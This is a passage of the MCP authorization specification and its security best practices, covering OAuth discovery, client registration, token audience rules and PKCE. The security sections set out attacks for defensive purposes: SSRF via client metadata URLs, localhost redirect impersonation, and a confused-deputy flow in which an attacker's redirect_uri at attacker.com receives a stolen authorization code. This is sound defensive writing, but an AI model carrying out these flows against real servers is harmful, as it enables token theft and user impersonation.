root_\n        C->>M: GET /.well-known/oauth-protected-resource/mcp\n        alt Sub-path metadata found\n            M-->>C: Resource metadata with authorization server URL\n        else Sub-path not found\n            C->>M: GET /.well-known/oauth-protected-resource\n            alt Root metadata found\n                M-->>C: Resource metadata with authorization server URL\n            else Root metadata not found\n                Note over C: Abort or use pre-configured values\n            end\n        end\n    end\n\n    Note over C: Validate RS metadata,<br />build AS metadata URL\n\n    C->>A: GET Authorization server metadata endpoint\n    Note over C,A: Try OAuth 2.0 and OpenID Connect<br/>discovery endpoints in priority order\n    A-->>C: Authorization server metadata\n\n    Note over C,A: OAuth 2.1 authorization flow happens here\n\n    C->>A: Token request\n    A-->>C: Access token\n\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n## Client Registration Approaches\n\nMCP supports three client registration mechanisms. Choose based on your scenario:\n\n- **Client ID Metadata Documents**: When client and server have no prior relationship (most common)\n- **Pre-registration**: When client and server have an existing relationship\n- **Dynamic Client Registration**: For backwards compatibility or specific requirements\n\nClients supporting all options **SHOULD** follow the following priority order:\n\n1. Use pre-registered client information for the server if the client has it available\n2. Use Client ID Metadata Documents if the Authorization Server indicates if the server supports it (via `client_id_metadata_document_supported` in OAuth Authorization Server Metadata)\n3. Use Dynamic Client Registration as a fallback if the Authorization Server supports it (via `registration_endpoint` in OAuth Authorization Server Metadata)\n4. Prompt the user to enter the client information if no other option is available\n\n### Client ID Metadata Documents\n\nMCP clients and authorization servers **SHOULD** support OAuth Client ID Metadata Documents as specified in\n[OAuth Client ID Metadata Document](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00).\nThis approach enables clients to use HTTPS URLs as client identifiers, where the URL points to a JSON document\ncontaining client metadata. This addresses the common MCP scenario where servers and clients have\nno pre-existing relationship.\n\n#### Implementation Requirements\n\nMCP implementations supporting Client ID Metadata Documents **MUST** follow the requirements specified in\n[OAuth Client ID Metadata Document](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00).\nKey requirements include:\n\n**For MCP Clients:**\n\n- Clients **MUST** host their metadata document at an HTTPS URL following RFC requirements\n- The `client_id` URL **MUST** use the \"https\" scheme and contain a path component, e.g. `https://example.com/client.json`\n- The metadata document **MUST** include at least the following properties: `client_id`, `client_name`, `redirect_uris`\n- Clients **MUST** ensure the `client_id` value in the metadata matches the document URL exactly\n- Clients **MAY** use `private_key_jwt` for client authentication (e.g., for requests to the token endpoint) with appropriate JWKS configuration as described in [Section 6.2 of Client ID Metadata Document](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.2)\n\n**For Authorization Servers:**\n\n- **SHOULD** fetch metadata documents when encountering URL-formatted client_ids\n- **MUST** validate that the fetched document's `client_id` matches the URL exactly\n- **SHOULD** cache metadata respecting HTTP cache headers\n- **MUST** validate redirect URIs presented in an authorization request against those in the metadata document\n- **MUST** validate the document structure is valid JSON and contains required fields\n- **SHOULD** follow the security considerations in [Section 6 of Client ID Metadata Document](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6)\n\n#### Example Metadata Document\n\n```json\n{\n  \"client_id\": \"https://app.example.com/oauth/client-metadata.json\",\n  \"client_name\": \"Example MCP Client\",\n  \"client_uri\": \"https://app.example.com\",\n  \"logo_uri\": \"https://app.example.com/logo.png\",\n  \"redirect_uris\": [\n    \"http://127.0.0.1:3000/callback\",\n    \"http://localhost:3000/callback\"\n  ],\n  \"grant_types\": [\"authorization_code\"],\n  \"response_types\": [\"code\"],\n  \"token_endpoint_auth_method\": \"none\"\n}\n```\n\n#### Client ID Metadata Documents Flow\n\nThe following diagram illustrates the complete flow when using Client ID Metadata Documents:\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client as MCP Client\n    participant Server as Authorization Server\n    participant Metadata as Metadata Endpoint<br/>(Client's HTTPS URL)\n    participant Resource as MCP Server\n\n    Note over Client,Metadata: Client hosts metadata at<br/>https://app.example.com/oauth/metadata.json\n\n    User->>Client: Initiates connection to MCP Server\n    Client->>Server: Authorization Request<br/>client_id=https://app.example.com/oauth/metadata.json<br/>redirect_uri=http://localhost:3000/callback\n\n    Server->>User: Authentication prompt\n    User->>Server: Provides credentials\n    Note over Server: Authenticates user\n\n    Note over Server: Detects URL-formatted client_id\n\n    Server->>Metadata: GET https://app.example.com/oauth/metadata.json\n    Metadata-->>Server: JSON Metadata Document<br/>{client_id, client_name, redirect_uris, ...}\n\n    Note over Server: Validates:<br/>1. client_id matches URL<br/>2. redirect_uri in allowed list<br/>3.

This could be:\n\n1. Hardcode a client ID (and, if applicable, client credentials) specifically for the MCP client to use when\n   interacting with that authorization server, or\n2. Present a UI to users that allows them to enter these details, after registering an\n   OAuth client themselves (e.g., through a configuration interface hosted by the\n   server).\n\n### Dynamic Client Registration\n\nMCP clients and authorization servers **MAY** support the\nOAuth 2.0 Dynamic Client Registration Protocol [RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)\nto allow MCP clients to obtain OAuth client IDs without user interaction.\nThis option is included for backwards compatibility with earlier versions of the MCP authorization spec.\n\n## Scope Selection Strategy\n\nWhen implementing authorization flows, MCP clients **SHOULD** follow the principle of least privilege by requesting\nonly the scopes necessary for their intended operations. During the initial authorization handshake, MCP clients\n**SHOULD** follow this priority order for scope selection:\n\n1. **Use `scope` parameter** from the initial `WWW-Authenticate` header in the 401 response, if provided\n2. **If `scope` is not available**, use all scopes defined in `scopes_supported` from the Protected Resource Metadata document, omitting the `scope` parameter if `scopes_supported` is undefined.\n\nThis approach accommodates the general-purpose nature of MCP clients, which typically lack domain-specific knowledge to make informed decisions about individual scope selection. Requesting all available scopes allows the authorization server and end-user to determine appropriate permissions during the consent process.\n\nThis approach minimizes user friction while following the principle of least privilege.\nThe `scopes_supported` field is intended to represent the minimal set of scopes necessary\nfor basic functionality (see [Scope Minimization](/specification/2025-11-25/basic/security_best_practices#scope-minimization)),\nwith additional scopes requested incrementally through the step-up authorization flow steps\ndescribed in the [Scope Challenge Handling](#scope-challenge-handling) section.\n\n## Authorization Flow Steps\n\nThe complete Authorization flow proceeds as follows:\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as Client\n    participant M as MCP Server (Resource Server)\n    participant A as Authorization Server\n\n    C->>M: MCP request without token\n    M->>C: HTTP 401 Unauthorized with WWW-Authenticate header\n    Note over C: Extract resource_metadata URL from WWW-Authenticate\n\n    C->>M: Request Protected Resource Metadata\n    M->>C: Return metadata\n\n    Note over C: Parse metadata and extract authorization server(s)<br/>Client determines AS to use\n\n    C->>A: GET Authorization server metadata endpoint\n    Note over C,A: Try OAuth 2.0 and OpenID Connect<br/>discovery endpoints in priority order\n    A-->>C: Authorization server metadata\n\n    alt Client ID Metadata Documents\n        Note over C: Client uses HTTPS URL as client_id\n        Note over A: Server detects URL-formatted client_id\n        A->>C: Fetch metadata from client_id URL\n        C-->>A: JSON metadata document\n        Note over A: Validate metadata and redirect_uris\n    else Dynamic client registration\n        C->>A: POST /register\n        A->>C: Client Credentials\n    else Pre-registered client\n        Note over C: Use existing client_id\n    end\n\n    Note over C: Generate PKCE parameters<br/>Include resource parameter<br/>Apply scope selection strategy\n    C->>B: Open browser with authorization URL + code_challenge + resource\n    B->>A: Authorization request with resource parameter\n    Note over A: User authorizes\n    A->>B: Redirect to callback with authorization code\n    B->>C: Authorization code callback\n    C->>A: Token request + code_verifier + resource\n    A->>C: Access token (+ refresh token)\n    C->>M: MCP request with access token\n    M-->>C: MCP response\n    Note over C,M: MCP communication continues with valid token\n```\n\n## Resource Parameter Implementation\n\nMCP clients **MUST** implement Resource Indicators for OAuth 2.0 as defined in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. The `resource` parameter:\n\n1. **MUST** be included in both authorization requests and token requests.\n2. **MUST** identify the MCP server that the client intends to use the token with.\n3. **MUST** use the canonical URI of the MCP server as defined in [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#name-access-token-request).\n\n### Canonical Server URI\n\nFor the purposes of this specification, the canonical URI of an MCP server is defined as the resource identifier as specified in\n[RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2) and aligns with the `resource` parameter in\n[RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728).\n\nMCP clients **SHOULD** provide the most specific URI that they can for the MCP server they intend to access, following the guidance in [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707). While the canonical form uses lowercase scheme and host components, implementations **SHOULD** accept uppercase scheme and host components for robustness and interoperability.\n\nExamples of valid canonical URIs:\n\n- `https://mcp.example.com/mcp`\n- `https://mcp.example.com`\n- `https://mcp.example.com:8443`\n- `https://mcp.example.com/server/mcp` (when path component is necessary to identify individual MCP server)\n\nExamples of invalid canonical URIs:\n\n- `mcp.example.com` (missing scheme)\n- `https://mcp.example.com#fragment` (contains fragment)\n\n> **Note:** While both `https://mcp.example.com/` (with trailing slash) and `https://mcp.example.com` (without trailing slash) are technically valid absolute URIs according to [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986), implementations **SHOULD** consistently use the form without the trailing slash for better interoperability unless the trailing slash is semantically significant for the specific resource.\n\nFor example, if accessing an MCP server at `https://mcp.example.com`, the authorization request would include:\n\n```\n&resource=https%3A%2F%2Fmcp.example.com\n```\n\nMCP clients **MUST** send this parameter regardless of whether authorization servers support it.\n\n## Access Token Usage\n\n### Token Requirements\n\nAccess token handling when making requests to MCP servers **MUST** conform to the requirements defined in\n[OAuth 2.1 Section 5 \"Resource Requests\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5).\nSpecifically:\n\n1. MCP client **MUST** use the Authorization request header field defined in\n   [OAuth 2.1 Section 5.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.1.1):\n\n```\nAuthorization: Bearer <access-token>\n```\n\nNote that authorization **MUST** be included in every HTTP request from client to server,\neven if they are part of the same logical session.\n\n2. Access tokens **MUST NOT** be included in the URI query string\n\nExample request:\n\n```http\nGET /mcp HTTP/1.1\nHost: mcp.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\n```\n\n### Token Handling\n\nMCP servers, acting in their role as an OAuth 2.1 resource server, **MUST** validate access tokens as described in\n[OAuth 2.1 Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.2).\nMCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience,\naccording to [RFC 8707 Section 2](https://www.rfc-editor.org/rfc/rfc8707.html#section-2).\nIf validation fails, servers **MUST** respond according to\n[OAuth 2.1 Section 5.3](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.3)\nerror handling requirements. Invalid or expired tokens **MUST** receive a HTTP 401\nresponse.\n\nMCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server.\n\nMCP servers **MUST** only accept tokens that are valid for use with their\nown resources.\n\nMCP servers **MUST NOT** accept or transit any other tokens.\n\n## Error Handling\n\nServers **MUST** return appropriate HTTP status codes for authorization errors:\n\n| Status Code | Description  | Usage                                      |\n| ----------- | ------------ | ------------------------------------------ |\n| 401         | Unauthorized | Authorization required or token invalid    |\n| 403         | Forbidden    | Invalid scopes or insufficient permissions |\n| 400         | Bad Request  | Malformed authorization request            |\n\n### Scope Challenge Handling\n\nThis section covers handling insufficient scope errors during runtime operations when\na client already has a token but needs additional permissions. This follows the error\nhandling patterns defined in [OAuth 2.1 Section 5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5)\nand leverages the metadata fields from [RFC 9728 (OAuth 2.0 Protected Resource Metadata)](https://datatracker.ietf.org/doc/html/rfc9728).\n\n#### Runtime Insufficient Scope Errors\n\nWhen a client makes a request with an access token with insufficient\nscope during runtime operations, the server **SHOULD** respond with:\n\n- `HTTP 403 Forbidden` status code (per [RFC 6750 Section 3.1](https://datatracker.ietf.org/doc/html/rfc6750#section-3.1))\n- `WWW-Authenticate` header with the `Bearer` scheme and additional parameters:\n  - `error=\"insufficient_scope\"` - indicating the specific type of authorization failure\n  - `scope=\"required_scope1 required_scope2\"` - specifying the minimum scopes needed for the operation\n  - `resource_metadata` - the URI of the Protected Resource Metadata document (for consistency with 401 responses)\n  - `error_description` (optional) - human-readable description of the error\n\n**Server Scope Management**: When responding with insufficient scope errors, servers\n**SHOULD** include the scopes needed to satisfy the current request in the `scope`\nparameter.\n\nServers have flexibility in determining which scopes to include:\n\n- **Minimum approach**: Include the newly-required scopes for the specific operation. Include any existing granted scopes as well, if they are required, to prevent clients from losing previously granted permissions.\n- **Recommended approach**: Include both existing relevant scopes and newly required scopes to prevent clients from losing previously granted permissions\n- **Extended approach**: Include existing scopes, newly required scopes, and related scopes that commonly work together\n\nThe choice depends on the server's assessment of user experience impact and authorization friction.\n\nServers **SHOULD** be consistent in their scope inclusion strategy to provide predictable behavior for clients.\n\nServers **SHOULD** consider the user experience impact when determining which scopes to include in the\nresponse, as misconfigured scopes may require frequent user interaction.\n\nExample insufficient scope response:\n\n```http\nHTTP/1.1 403 Forbidden\nWWW-Authenticate: Bearer error=\"insufficient_scope\",\n                         scope=\"files:read files:write user:profile\",\n                         resource_metadata=\"https://mcp.example.com/.well-known/oauth-protected-resource\",\n                         error_description=\"Additional file write permission required\"\n```\n\n#### Step-Up Authorization Flow\n\nClients will receive scope-related errors during initial authorization or at runtime (`insufficient_scope`).\nClients **SHOULD** respond to these errors by requesting a new access token with an increased set of scopes via a step-up authorization flow or handle the errors in other, appropriate ways.\nClients acting on behalf of a user **SHOULD** attempt the step-up authorization flow. Clients acting on their own behalf (`client_credentials` clients)\n**MAY** attempt the step-up authorization flow or abort the request immediately.\n\nThe flow is as follows:\n\n1. **Parse error information** from the authorization server response or `WWW-Authenticate` header\n2. **Determine required scopes** as outlined in [Scope Selection Strategy](#scope-selection-strategy).\n3. **Initiate (re-)authorization** with the determined scope set\n4. **Retry the original request** with the new authorization no more than a few times and treat this as a permanent authorization failure\n\nClients **SHOULD** implement retry limits and **SHOULD** track scope upgrade attempts to avoid\nrepeated failures for the same resource and operation combination.\n\n## Security Considerations\n\nImplementations **MUST** follow OAuth 2.1 security best practices as laid out in [OAuth 2.1 Section 7. \"Security Considerations\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#name-security-considerations).\n\n### Token Audience Binding and Validation\n\n[RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) Resource Indicators provide critical security benefits by binding tokens to their intended\naudiences **when the Authorization Server supports the capability**. To enable current and future adoption:\n\n- MCP clients **MUST** include the `resource` parameter in authorization and token requests as specified in the [Resource Parameter Implementation](#resource-parameter-implementation) section\n- MCP servers **MUST** validate that tokens presented to them were specifically issued for their use\n\nThe [Security Best Practices document](/specification/2025-11-25/basic/security_best_practices#token-passthrough)\noutlines why token audience validation is crucial and why token passthrough is explicitly forbidden.\n\n### Token Theft\n\nAttackers who obtain tokens stored by the client, or tokens cached or logged on the server can access protected resources with\nrequests that appear legitimate to resource servers.\n\nClients and servers **MUST** implement secure token storage and follow OAuth best practices,\nas outlined in [OAuth 2.1, Section 7.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.1).\n\nAuthorization servers **SHOULD** issue short-lived access tokens to reduce the impact of leaked tokens.\nFor public clients, authorization servers **MUST** rotate refresh tokens as described in [OAuth 2.1 Section 4.3.1 \"Token Endpoint Extension\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.3.1).\n\n### Communication Security\n\nImplementations **MUST** follow [OAuth 2.1 Section 1.5 \"Communication Security\"](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-1.5).\n\nSpecifically:\n\n1. All authorization server endpoints **MUST** be served over HTTPS.\n1. All redirect URIs **MUST** be either `localhost` or use HTTPS.\n\n### Authorization Code Protection\n\nAn attacker who has gained access to an authorization code contained in an authorization response can try to redeem the authorization code for an access token or otherwise make use of the authorization code.\n(Further described in [OAuth 2.1 Section 7.5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5))\n\nTo mitigate this, MCP clients **MUST** implement PKCE according to [OAuth 2.1 Section 7.5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.5.2) and **MUST** verify PKCE support before proceeding with authorization.\nPKCE helps prevent authorization code interception and injection attacks by requiring clients to create a secret verifier-challenge pair, ensuring that only the original requestor can exchange an authorization code for tokens.\n\nMCP clients **MUST** use the `S256` code challenge method when technically capable, as required by [OAuth 2.1 Section 4.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.1.1).\n\nSince OAuth 2.1 and PKCE specifications do not define a mechanism for clients to discover PKCE support, MCP clients **MUST** rely on authorization server metadata to verify this capability:\n\n- **OAuth 2.0 Authorization Server Metadata**: If `code_challenge_methods_supported` is absent, the authorization server does not support PKCE and MCP clients **MUST** refuse to proceed.\n\n- **OpenID Connect Discovery 1.0**: While the [OpenID Provider Metadata](https://openid.net/specs/openid-connect-discovery-1_0.html#ProviderMetadata) does not define `code_challenge_methods_supported`, this field is commonly included by OpenID providers. MCP clients **MUST** verify the presence of `code_challenge_methods_supported` in the provider metadata response. If the field is absent, MCP clients **MUST** refuse to proceed.\n\nAuthorization servers providing OpenID Connect Discovery 1.0 **MUST** include `code_challenge_methods_supported` in their metadata to ensure MCP compatibility.\n\n### Open Redirection\n\nAn attacker may craft malicious redirect URIs to direct users to phishing sites.\n\nMCP clients **MUST** have redirect URIs registered with the authorization server.\n\nAuthorization servers **MUST** validate exact redirect URIs against pre-registered values to prevent redirection attacks.\n\nMCP clients **SHOULD** use and verify state parameters in the authorization code flow\nand discard any results that do not include or have a mismatch with the original state.\n\nAuthorization servers **MUST** take precautions to prevent redirecting user agents to untrusted URI's, following suggestions laid out in [OAuth 2.1 Section 7.12.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-7.12.2)\n\nAuthorization servers **SHOULD** only automatically redirect the user agent if it trusts the redirection URI. If the URI is not trusted, the authorization server MAY inform the user and rely on the user to make the correct decision.\n\n### Client ID Metadata Document Security\n\nWhen implementing Client ID Metadata Documents, authorization servers **MUST** consider the security implications\ndetailed in [OAuth Client ID Metadata Document, Section 6](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-security-considerations).\nKey considerations include:\n\n#### Authorization Server Abuse Protection\n\nThe authorization server takes a URL as input from an unknown client and fetches that URL.\nA malicious client could use this to trigger the authorization server to make requests to arbitrary URLs,\nsuch as requests to private administration endpoints the authorization server has access to.\n\nAuthorization servers fetching metadata documents **SHOULD** consider\n[Server-Side Request Forgery (SSRF)](https://developer.mozilla.org/docs/Web/Security/Attacks/SSRF) risks, as described in [OAuth Client ID Metadata Document: Server Side Request Forgery (SSRF) Attacks](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery).\n\n#### Localhost Redirect URI Risks\n\nClient ID Metadata Documents cannot prevent `localhost` URL impersonation by themselves. An attacker can claim to be any client by:\n\n1. Providing the legitimate client's metadata URL as their `client_id`\n2. Binding to the any `localhost` port, and providing that address as the redirect_uri\n3. Receiving the authorization code via the redirect when the user approves\n\nThe server will see the legitimate client's metadata document and the user will see the legitimate client's name, making attack detection difficult.\n\nAuthorization servers:\n\n- **SHOULD** display additional warnings for `localhost`-only redirect URIs\n- **MAY** require additional attestation mechanisms for enhanced security\n- **MUST** clearly display the redirect URI hostname during authorization\n\n#### Trust Policies\n\nAuthorization servers **MAY** implement domain-based trust policies:\n\n- Allowlists for trusted domains (for protected servers)\n- Accept any HTTPS `client_id` (for open servers)\n- Reputation checks for unknown domains\n- Restrictions based on domain age or certificate validation\n- Display the CIMD and other associated client hostnames prominently to prevent phishing\n\nServers maintain full control over their access policies.\n\n### Confused Deputy Problem\n\nAttackers can exploit MCP servers acting as intermediaries to third-party APIs, leading to [confused deputy vulnerabilities](/specification/2025-11-25/basic/security_best_practices#confused-deputy-problem).\nBy using stolen authorization codes, they can obtain access tokens without user consent.\n\nMCP proxy servers using static client IDs **MUST** obtain user consent for each dynamically\nregistered client before forwarding to third-party authorization servers (which may require additional consent).\n\n### Access Token Privilege Restriction\n\nAn attacker can gain unauthorized access or otherwise compromise an MCP server if the server accepts tokens issued for other resources.\n\nThis vulnerability has two critical dimensions:\n\n1. **Audience validation failures.** When an MCP server doesn't verify that tokens were specifically intended for it (for example, via the audience claim, as mentioned in [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html)), it may accept tokens originally issued for other services. This breaks a fundamental OAuth security boundary, allowing attackers to reuse legitimate tokens across different services than intended.\n2. **Token passthrough.** If the MCP server not only accepts tokens with incorrect audiences but also forwards these unmodified tokens to downstream services, it can potentially cause the [\"confused deputy\" problem](#confused-deputy-problem), where the downstream API may incorrectly trust the token as if it came from the MCP server or assume the token was validated by the upstream API. See the [Token Passthrough section](/specification/2025-11-25/basic/security_best_practices#token-passthrough) of the Security Best Practices guide for additional details.\n\nMCP servers **MUST** validate access tokens before processing the request, ensuring the access token is issued specifically for the MCP server, and take all necessary steps to ensure no data is returned to unauthorized parties.\n\nA MCP server **MUST** follow the guidelines in [OAuth 2.1 - Section 5.2](https://www.ietf.org/archive/id/draft-ietf-oauth-v2-1-13.html#section-5.2) to validate inbound tokens.\n\nMCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token. See the [Security Best Practices Token Passthrough section](/specification/2025-11-25/basic/security_best_practices#token-passthrough) for details.\n\nIf the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client.\n\nMCP clients **MUST** implement and use the `resource` parameter as defined in [RFC 8707 - Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707.html)\nto explicitly specify the target resource for which the token is being requested. This requirement aligns with the recommendation in\n[RFC 9728 Section 7.4](https://datatracker.ietf.org/doc/html/rfc9728#section-7.4). This ensures that access tokens are bound to their intended resources and\ncannot be misused across different services.\n\n## MCP Authorization Extensions\n\nThere are several authorization extensions to the core protocol that define additional authorization mechanisms. These extensions are:\n\n- **Optional** - Implementations can choose to adopt these extensions\n- **Additive** - Extensions do not modify or break core protocol functionality; they add new capabilities while preserving core protocol behavior\n- **Composable** - Extensions are modular and designed to work together without conflicts, allowing implementations to adopt multiple extensions simultaneously\n- **Versioned independently** - Extensions follow the core MCP versioning cycle but may adopt independent versioning as needed\n\nA list of supported extensions can be found in the [MCP Authorization Extensions](https://github.com/modelcontextprotocol/ext-auth) repository.\n"}

This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.\n\n#### Terminology\n\n**MCP Proxy Server**\n: An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server.\n\n**Third-Party Authorization Server**\n: Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring the MCP proxy to use a static client ID for all requests.\n\n**Third-Party API**\n: The protected resource server that provides the actual API functionality. Access to this\nAPI requires tokens issued by the third-party authorization server.\n\n**Static Client ID**\n: A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with\nthe third-party authorization server. This Client ID refers to the MCP server acting as a client\nto the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of\nwhich MCP client initiated the request.\n\n#### Vulnerable Conditions\n\nThis attack becomes possible when all of the following conditions are present:\n\n- MCP proxy server uses a **static client ID** with a third-party authorization server\n- MCP proxy server allows MCP clients to **dynamically register** (each getting their own client_id)\n- The third-party authorization server sets a **consent cookie** after the first authorization\n- MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization\n\n#### Architecture and Attack Flows\n\n##### Normal OAuth proxy usage (preserves user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant MC as MCP Client\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n\n    Note over UA,M: Initial Auth flow completed\n\n    Note over UA,TAS: Step 1: Legitimate user consent for Third Party Server\n\n    M->>UA: Redirect to third party authorization server\n    UA->>TAS: Authorization request (client_id: mcp-proxy)\n    TAS->>UA: Authorization consent screen\n    Note over UA: Review consent screen\n    UA->>TAS: Approve\n    TAS->>UA: Set consent cookie for client ID: mcp-proxy\n    TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n    UA->>M: 3P Authorization code\n    Note over M,TAS: Exchange 3P code for 3P token\n    Note over M: Generate MCP authorization code\n    M->>UA: Redirect to MCP Client with MCP authorization code\n\n    Note over M,UA: Exchange code for token, etc.\n```\n\n##### Malicious OAuth proxy usage (skips user consent)\n\n```mermaid\nsequenceDiagram\n    participant UA as User-Agent (Browser)\n    participant M as MCP Proxy Server\n    participant TAS as Third-Party Authorization Server\n    participant A as Attacker\n\n\n    Note over UA,A: Step 2: Attack (leveraging existing cookie, skipping consent)\n    A->>M: Dynamically register malicious client, redirect_uri: attacker.com\n    A->>UA: Sends malicious link\n    UA->>TAS: Authorization request (client_id: mcp-proxy) + consent cookie\n    rect rgba(255, 17, 0, 0.67)\n    TAS->>TAS: Cookie present, consent skipped\n    end\n\n   TAS->>UA: 3P Authorization code + redirect to mcp-proxy-server.com\n   UA->>M: 3P Authorization code\n   Note over M,TAS: Exchange 3P code for 3P token\n   Note over M: Generate MCP authorization code\n   M->>UA: Redirect to attacker.com with MCP Authorization code\n   UA->>A: MCP Authorization code delivered to attacker.com\n   Note over M,A: Attacker exchanges MCP code for MCP token\n   A->>M: Attacker impersonates user to MCP server\n```\n\n#### Attack Description\n\nWhen an MCP proxy server uses a static client ID to authenticate with a third-party\nauthorization server, the following attack becomes possible:\n\n1. A user authenticates normally through the MCP proxy server to access the third-party API\n2. During this flow, the third-party authorization server sets a cookie on the user agent\n   indicating consent for the static client ID\n3. An attacker later sends the user a malicious link containing a crafted authorization request which contains a malicious redirect URI along with a new dynamically registered client ID\n4. When the user clicks the link, their browser still has the consent cookie from the previous legitimate request\n5. The third-party authorization server detects the cookie and skips the consent screen\n6. The MCP authorization code is redirected to the attacker's server (specified in the malicious `redirect_uri` parameter during [dynamic client registration](/specification/2025-11-25/basic/authorization#dynamic-client-registration))\n7. The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user's explicit approval\n8. The attacker now has access to the third-party API as the compromised user\n\n#### Mitigation\n\nTo prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below.\n\n##### Consent Flow Implementation\n\nThe following diagram shows how to properly implement per-client consent that runs **before** the third-party authorization flow:\n\n```mermaid\nsequenceDiagram\n    participant Client as MCP Client\n    participant Browser as User's Browser\n    participant MCP as MCP Server\n    participant ThirdParty as Third-Party AuthZ Server\n\n    Note over Client,ThirdParty: 1.

Proper state validation ensures that consent approval at the authorization endpoint is enforced at the callback endpoint.\n\nMCP proxy servers implementing OAuth flows **MUST**:\n\n- Generate a cryptographically secure random `state` value for each authorization request\n- Store the `state` value server-side (in a secure session store or encrypted cookie) **only after** consent has been explicitly approved\n- Set the `state` tracking cookie/session **immediately before** redirecting to the third-party identity provider (not before consent approval)\n- Validate at the callback endpoint that the `state` query parameter exactly matches the stored value in the callback request's cookies or in the request's cookie-based session\n- Reject any callback requests where the `state` parameter is missing or does not match\n- Ensure `state` values are single-use (delete after validation) and have a short expiration time (e.g., 10 minutes)\n\nThe consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server's authorization endpoint. Setting this cookie before consent approval renders the consent screen ineffective, as an attacker could bypass it by crafting a malicious authorization request.\n\n### Token Passthrough\n\n\"Token passthrough\" is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued _to the MCP server_ and passes them through to the downstream API.\n\n#### Risks\n\nToken passthrough is explicitly forbidden in the [authorization specification](/specification/2025-11-25/basic/authorization) as it introduces a number of security risks, that include:\n\n- **Security Control Circumvention**\n  - The MCP Server or downstream APIs might implement important security controls like rate limiting, request validation, or traffic monitoring, that depend on the token audience or other credential constraints. If clients can obtain and use tokens directly with the downstream APIs without the MCP server validating them properly or ensuring that the tokens are issued for the right service, they bypass these controls.\n- **Accountability and Audit Trail Issues**\n  - The MCP Server will be unable to identify or distinguish between MCP Clients when clients are calling with an upstream-issued access token which may be opaque to the MCP Server.\n  - The downstream Resource Server’s logs may show requests that appear to come from a different source with a different identity, rather than the MCP server that is actually forwarding the tokens.\n  - Both factors make incident investigation, controls, and auditing more difficult.\n  - If the MCP Server passes tokens without validating their claims (e.g., roles, privileges, or audience) or other metadata, a malicious actor in possession of a stolen token can use the server as a proxy for data exfiltration.\n- **Trust Boundary Issues**\n  - The downstream Resource Server grants trust to specific entities. This trust might include assumptions about origin or client behavior patterns. Breaking this trust boundary could lead to unexpected issues.\n  - If the token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services.\n- **Future Compatibility Risk**\n  - Even if an MCP Server starts as a \"pure proxy\" today, it might need to add security controls later. Starting with proper token audience separation makes it easier to evolve the security model.\n\n#### Mitigation\n\nMCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.\n\n### Session Hijacking\n\nSession hijacking is an attack vector where a client is provided a session ID by the server, and an unauthorized party is able to obtain and use that same session ID to impersonate the original client and perform unauthorized actions on their behalf.\n\n#### Session Hijack Prompt Injection\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant ServerA\n    participant Queue\n    participant 